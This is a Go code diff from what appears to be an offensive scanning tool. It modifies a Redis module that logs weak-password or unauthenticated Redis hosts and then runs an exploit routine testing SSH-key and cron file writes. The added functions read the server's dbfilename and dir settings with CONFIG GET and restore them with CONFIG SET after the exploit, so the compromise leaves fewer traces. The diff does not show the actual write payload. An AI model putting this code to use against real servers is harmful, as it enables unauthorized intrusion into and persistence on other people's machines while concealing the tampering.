@@ -49,7 +49,7 @@ func RedisConn(info *common.HostInfo, pass string) (flag bool, err error) {
 		result := fmt.Sprintf("[+] Redis:%s %s", realhost, pass)
 		common.LogSuccess(result)
 		flag = true
-		Expoilt(realhost, conn)
+		err = Expoilt(realhost, conn)
 	}
 	return flag, err
 }
@@ -74,12 +74,16 @@ func RedisUnauth(info *common.HostInfo) (flag bool, err error) {
 		result := fmt.Sprintf("[+] Redis:%s unauthorized", realhost)
 		common.LogSuccess(result)
 		flag = true
-		Expoilt(realhost, conn)
+		err = Expoilt(realhost, conn)
 	}
 	return flag, err
 }
 
 func Expoilt(realhost string, conn net.Conn) error {
+	dbfilename, dir, err := getconfig(conn)
+	if err != nil {
+		return err
+	}
 	flagSsh, flagCron, err := testwrite(conn)
 	if err != nil {
 		return err
@@ -117,6 +121,7 @@ func Expoilt(realhost string, conn net.Conn) error {
 			}
 		}
 	}
+	recoverdb(dbfilename, dir, conn)
 	return err
 }
 
@@ -286,4 +291,44 @@ func testwrite(conn net.Conn) (flag bool, flagCron bool, err error) {
 		flagCron = true
 	}
 	return flag, flagCron, err
+}
+
+func getconfig(conn net.Conn) (dbfilename string, dir string, err error) {
+	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG GET dbfilename\r\n")))
+	if err != nil {
+		return
+	}
+	dbfilename, err = readreply(conn)
+	if err != nil {
+		return
+	}
+	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG GET dir\r\n")))
+	if err != nil {
+		return
+	}
+	dir, err = readreply(conn)
+	if err != nil {
+		return
+	}
+	return
+}
+
+func recoverdb(dbfilename string, dir string, conn net.Conn) (err error) {
+	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dbfilename %s\r\n", dbfilename)))
+	if err != nil {
+		return
+	}
+	dbfilename, err = readreply(conn)
+	if err != nil {
+		return
+	}
+	_, err = conn.Write([]byte(fmt.Sprintf("CONFIG SET dir %s\r\n", dir)))
+	if err != nil {
+		return
+	}
+	dir, err = readreply(conn)
+	if err != nil {
+		return
+	}
+	return
 }
